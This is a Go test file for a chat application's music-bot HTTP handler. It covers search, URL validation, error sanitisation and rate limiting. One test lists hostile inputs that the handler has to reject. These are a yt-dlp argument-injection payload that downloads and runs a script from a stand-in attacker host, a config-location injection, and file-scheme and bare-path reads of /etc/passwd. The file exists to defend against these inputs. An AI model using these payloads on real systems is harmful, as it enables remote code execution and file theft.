package handlers

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/argeinfina/hichat/models"
	"github.com/argeinfina/hichat/pkg"
	"github.com/argeinfina/hichat/pkg/ratelimit"
	"github.com/argeinfina/hichat/services"
)

// ─── Stubs ───
//
// Minimal interface implementations — recorded calls let us verify
// the handler doesn't reach the service layer when validation rejects
// a request (the central RCE-prevention guarantee for /music/play).

type stubMusicService struct {
	enqueueCalled bool
	lastURL       string
	enqueueErr    error
}

func (s *stubMusicService) Enqueue(_ context.Context, _, _, url string) ([]models.MusicTrack, error) {
	s.enqueueCalled = true
	s.lastURL = url
	if s.enqueueErr != nil {
		return nil, s.enqueueErr
	}
	return []models.MusicTrack{}, nil
}

type stubDetailedMusicService struct {
	*stubMusicService
	mayHaveSkippedTracks bool
}

func (s *stubDetailedMusicService) EnqueueWithResult(ctx context.Context, userID, channelID, url string) (services.MusicEnqueueResult, error) {
	tracks, err := s.Enqueue(ctx, userID, channelID, url)
	return services.MusicEnqueueResult{AddedTracks: tracks, MayHaveSkippedTracks: s.mayHaveSkippedTracks}, err
}
func (s *stubMusicService) Skip(string) error                            { return nil }
func (s *stubMusicService) Pause(string) error                           { return nil }
func (s *stubMusicService) Resume(string) error                          { return nil }
func (s *stubMusicService) Stop(string) error                            { return nil }
func (s *stubMusicService) RemoveQueueItem(string, string, uint64) error { return nil }
func (s *stubMusicService) ReorderQueue(string, []string, uint64) error  { return nil }
func (s *stubMusicService) ShuffleQueue(string, uint64) error            { return nil }
func (s *stubMusicService) SetRepeatMode(string, string) error           { return nil }
func (s *stubMusicService) Seek(string, int) error                       { return nil }
func (s *stubMusicService) Restore(context.Context, string) error        { return nil }
func (s *stubMusicService) GetState(string) *models.MusicBotChannelState { return nil }
func (s *stubMusicService) StopAllForChannel(string)                     {}

// stubPermResolver always grants — perm check is not under test here.
type stubPermResolver struct{}

func (stubPermResolver) ResolveChannelPermissions(_ context.Context, _, _ string) (models.Permission, error) {
	return models.PermAll, nil
}

func (stubPermResolver) ResolveChannelPermissionsBulk(_ context.Context, _ string, userIDs []string) (map[string]models.Permission, error) {
	out := make(map[string]models.Permission, len(userIDs))
	for _, userID := range userIDs {
		out[userID] = models.PermAll
	}
	return out, nil
}

// Compile-time interface conformance assertions.
var (
	_ services.MusicBotService     = (*stubMusicService)(nil)
	_ services.ChannelPermResolver = stubPermResolver{}
)

// ─── Helpers ───

func newPlayRequest(t *testing.T, body string) *http.Request {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/servers/srv/channels/ch/music/play", bytes.NewBufferString(body))
	req.SetPathValue("channelId", "ch")
	req.Header.Set("Content-Type", "application/json")
	// Inject an authenticated user — Play() requires UserContextKey set.
	user := &models.User{ID: "user-1", Username: "tester"}
	req = req.WithContext(context.WithValue(req.Context(), UserContextKey, user))
	return req
}

func TestSearch_ReturnsSelectableResultsWithoutQueueMutation(t *testing.T) {
	music := &stubMusicService{}
	h := NewMusicHandler(music, stubPermResolver{}, nil)
	h.search = func(_ context.Context, query string) ([]models.MusicTrack, error) {
		if query != "daft punk" {
			t.Fatalf("query = %q", query)
		}
		return []models.MusicTrack{{VideoID: "abcdefghijk", Title: "Result", URL: "https://www.youtube.com/watch?v=abcdefghijk"}}, nil
	}
	req := httptest.NewRequest(http.MethodGet, "/api/servers/srv/channels/ch/music/search?q=daft+punk", nil)
	req.SetPathValue("channelId", "ch")
	req = req.WithContext(context.WithValue(req.Context(), UserContextKey, &models.User{ID: "user-1"}))
	rec := httptest.NewRecorder()
	h.Search(rec, req)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"video_id":"abcdefghijk"`) {
		t.Fatalf("search response = %d %s", rec.Code, rec.Body.String())
	}
	if music.enqueueCalled {
		t.Fatal("search must not mutate the queue")
	}
}

func TestSearch_RejectsOversizedQueryBeforeProvider(t *testing.T) {
	h := NewMusicHandler(&stubMusicService{}, stubPermResolver{}, nil)
	called := false
	h.search = func(context.Context, string) ([]models.MusicTrack, error) { called = true; return nil, nil }
	req := httptest.NewRequest(http.MethodGet, "/api/servers/srv/channels/ch/music/search?q="+strings.Repeat("x", 101), nil)
	req.SetPathValue("channelId", "ch")
	req = req.WithContext(context.WithValue(req.Context(), UserContextKey, &models.User{ID: "user-1"}))
	rec := httptest.NewRecorder()
	h.Search(rec, req)
	if rec.Code != http.StatusBadRequest || called {
		t.Fatalf("status=%d provider_called=%v", rec.Code, called)
	}
}

type musicDeadlineRecorder struct {
	http.ResponseWriter
	deadlines chan<- time.Duration
}

func (w musicDeadlineRecorder) SetWriteDeadline(deadline time.Time) error {
	w.deadlines <- time.Until(deadline)
	return http.NewResponseController(w.ResponseWriter).SetWriteDeadline(deadline)
}

func TestSearch_PreservesResponseAfterServerWriteTimeout(t *testing.T) {
	for _, tc := range []struct {
		name        string
		providerErr error
		status      int
		body        string
	}{
		{name: "results", status: http.StatusOK, body: `"video_id":"abcdefghijk"`},
		{name: "provider failure", providerErr: errors.New("private provider detail"), status: http.StatusInternalServerError, body: `"error":"failed to search YouTube"`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			const shortWriteTimeout = 50 * time.Millisecond
			h := NewMusicHandler(&stubMusicService{}, stubPermResolver{}, nil)
			h.search = func(context.Context, string) ([]models.MusicTrack, error) {
				// Cross the real HTTP server's original socket write deadline.
				time.Sleep(2 * shortWriteTimeout)
				return []models.MusicTrack{{VideoID: "abcdefghijk"}}, tc.providerErr
			}
			deadlines := make(chan time.Duration, 1)
			server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				r.SetPathValue("channelId", "ch")
				r = r.WithContext(context.WithValue(r.Context(), UserContextKey, &models.User{ID: "user-1"}))
				h.Search(musicDeadlineRecorder{ResponseWriter: w, deadlines: deadlines}, r)
			}))
			server.Config.WriteTimeout = shortWriteTimeout
			server.Start()
			defer server.Close()
			client := server.Client()
			client.Timeout = 3 * time.Second
			response, err := client.Get(server.URL + "/music/search?q=song")
			if err != nil {
				t.Fatalf("search lost its response after the original write deadline: %v", err)
			}
			defer response.Body.Close()
			body, err := io.ReadAll(response.Body)
			if err != nil {
				t.Fatal(err)
			}
			if response.StatusCode != tc.status || response.Header.Get("Content-Type") != "application/json" || !strings.Contains(string(body), tc.body) {
				t.Fatalf("response = %d %q %s", response.StatusCode, response.Header.Get("Content-Type"), body)
			}
			if strings.Contains(string(body), "private provider detail") {
				t.Fatalf("response leaked provider details: %s", body)
			}
			select {
			case duration := <-deadlines:
				if duration < 24*time.Second || duration > 25*time.Second {
					t.Fatalf("search write deadline is not bounded at 25 seconds: %v", duration)
				}
			default:
				t.Fatal("search did not extend its response deadline")
			}
		})
	}
}

// ─── Tests ───

// TestPlay_RejectsNonHTTPScheme — the RCE protection: any URL that
// doesn't start with http:// or https:// must be rejected with 400
// BEFORE the music service is invoked. This blocks yt-dlp argument
// injection payloads like `--exec "..."` at the HTTP edge.
func TestPlay_RejectsNonHTTPScheme(t *testing.T) {
	cases := []struct {
		name string
		url  string
	}{
		{"argument-injection-exec", `--exec "wget http://attacker/x -O /tmp/x && sh /tmp/x"`},
		{"argument-injection-config", `--config-location /tmp/evil`},
		{"file-scheme", `file:///etc/passwd`},
		{"ftp-scheme", `ftp://example.com/file`},
		{"bare-path", `/etc/passwd`},
		{"javascript-uri", `javascript:alert(1)`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			music := &stubMusicService{}
			h := NewMusicHandler(music, stubPermResolver{}, nil)

			rec := httptest.NewRecorder()
			req := newPlayRequest(t, `{"url":`+jsonString(tc.url)+`}`)
			h.Play(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d (body: %s)", rec.Code, rec.Body.String())
			}
			if music.enqueueCalled {
				t.Fatalf("Enqueue must NOT be called for rejected URL %q (got: %q)", tc.url, music.lastURL)
			}
		})
	}
}

// TestPlay_AcceptsHTTPSchemes — sanity check that legitimate URLs reach
// the service. Without this, a too-strict validator could silently break
// the music feature; this test would catch that.
func TestPlay_AcceptsHTTPSchemes(t *testing.T) {
	cases := []string{
		"http://example.com/video",
		"https://youtu.be/dQw4w9WgXcQ",
		"https://www.youtube.com/watch?v=dQw4w9WgXcQ",
	}
	for _, url := range cases {
		t.Run(url, func(t *testing.T) {
			music := &stubMusicService{}
			h := NewMusicHandler(music, stubPermResolver{}, nil)

			rec := httptest.NewRecorder()
			req := newPlayRequest(t, `{"url":`+jsonString(url)+`}`)
			h.Play(rec, req)

			if rec.Code != http.StatusOK {
				t.Fatalf("expected 200 for %q, got %d (body: %s)", url, rec.Code, rec.Body.String())
			}
			if !music.enqueueCalled {
				t.Fatalf("Enqueue must be called for valid URL %q", url)
			}
			if music.lastURL != url {
				t.Fatalf("Enqueue got url=%q, want %q", music.lastURL, url)
			}
		})
	}
}

func TestPlay_ReportsObservedPlaylistOmissions(t *testing.T) {
	music := &stubDetailedMusicService{stubMusicService: &stubMusicService{}, mayHaveSkippedTracks: true}
	h := NewMusicHandler(music, stubPermResolver{}, nil)
	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":"https://www.youtube.com/playlist?list=public"}`)
	h.Play(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `"may_have_skipped_tracks":true`) {
		t.Fatalf("response omitted observed partial-result advisory: %s", rec.Body.String())
	}
}

// TestPlay_RejectsEmptyURL — early-return path for {"url":""}; preserved
// behavior, just covered by a test now.
func TestPlay_RejectsEmptyURL(t *testing.T) {
	music := &stubMusicService{}
	h := NewMusicHandler(music, stubPermResolver{}, nil)

	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":""}`)
	h.Play(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", rec.Code)
	}
	if music.enqueueCalled {
		t.Fatal("Enqueue must NOT be called for empty URL")
	}
}

// TestPlay_BadRequestFromServiceMaps400 — when Enqueue's error chain wraps
// pkg.ErrBadRequest (the shape a music_url_guard.go rejection takes, e.g.
// "yt-dlp extraction failed: bad request: host not allowed"), the handler
// must map it to 400, not the generic 500 the old unconditional
// ErrorWithMessage branch produced.
func TestPlay_BadRequestFromServiceMaps400(t *testing.T) {
	music := &stubMusicService{enqueueErr: fmt.Errorf("yt-dlp extraction failed: %w", pkg.ErrBadRequest)}
	h := NewMusicHandler(music, stubPermResolver{}, nil)

	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":"https://www.youtube.com/watch?v=x"}`)
	h.Play(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d (body: %s)", rec.Code, rec.Body.String())
	}
}

// TestPlay_InternalErrorDoesNotLeakDSN — a non-sentinel Enqueue error (e.g.
// a repository failure wrapping a raw libSQL/Turso driver error) must never
// reach the client's response body at all. pkg.ErrText is a LOG renderer,
// not an HTTP sanitizer — it only strips a fixed list of known credential
// query-params (see pkg/redact.go) and would still let a Turso hostname or
// other internal detail through. The handler must instead route 5xx errors
// through pkg.ErrorCtx, which replaces the body with a generic message and
// logs the real err server-side (CWE-209 policy, pkg/response.go). This test
// checks both the obvious secret (authToken value) and a non-credential
// internal detail (the Turso hostname) that ErrText alone would not redact.
func TestPlay_InternalErrorDoesNotLeakDSN(t *testing.T) {
	music := &stubMusicService{enqueueErr: errors.New("dial libsql://db.turso.io?authToken=SUPERSECRET: refused")}
	h := NewMusicHandler(music, stubPermResolver{}, nil)

	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":"https://www.youtube.com/watch?v=x"}`)
	h.Play(rec, req)

	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d (body: %s)", rec.Code, rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "SUPERSECRET") {
		t.Fatalf("response body leaked DSN credential: %s", rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "db.turso.io") {
		t.Fatalf("response body leaked internal hostname (ErrText alone would not have caught this): %s", rec.Body.String())
	}
}

// TestPlay_RateLimit — POST .../music/play must be rate-limited per user
// (resource scan 2026-08-02): each call can spawn a ~30s yt-dlp subprocess,
// so an unthrottled caller could pin CPU/bandwidth with a fast loop.
// Requests within budget succeed; once the budget is exhausted, further
// requests get 429 with a Retry-After header and the music service is never
// reached for the rejected request.
func TestPlay_RateLimit(t *testing.T) {
	music := &stubMusicService{}
	limiter := ratelimit.NewMessageRateLimiter(2, time.Minute, 30*time.Second)
	h := NewMusicHandler(music, stubPermResolver{}, limiter)

	// First two requests are within the 2/min budget.
	for i := 0; i < 2; i++ {
		rec := httptest.NewRecorder()
		req := newPlayRequest(t, `{"url":"https://www.youtube.com/watch?v=x"}`)
		h.Play(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("request %d: expected 200, got %d (body: %s)", i+1, rec.Code, rec.Body.String())
		}
	}
	if !music.enqueueCalled {
		t.Fatal("Enqueue should have been called for in-budget requests")
	}

	// Third request exceeds the budget.
	music.enqueueCalled = false
	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":"https://www.youtube.com/watch?v=x"}`)
	h.Play(rec, req)

	if rec.Code != http.StatusTooManyRequests {
		t.Fatalf("expected 429, got %d (body: %s)", rec.Code, rec.Body.String())
	}
	if rec.Header().Get("Retry-After") == "" {
		t.Fatal("expected Retry-After header on 429 response")
	}
	if music.enqueueCalled {
		t.Fatal("Enqueue must NOT be called once the rate limit is exceeded")
	}
}

// jsonString — minimal JSON string escaper for embedding test inputs
// inline. Handles the two characters we actually exercise in these test
// payloads (backslash + double-quote); good enough to avoid pulling in
// encoding/json just to build a one-line body.
func jsonString(s string) string {
	var b bytes.Buffer
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '"':
			b.WriteString(`\"`)
		default:
			b.WriteRune(r)
		}
	}
	b.WriteByte('"')
	return b.String()
}
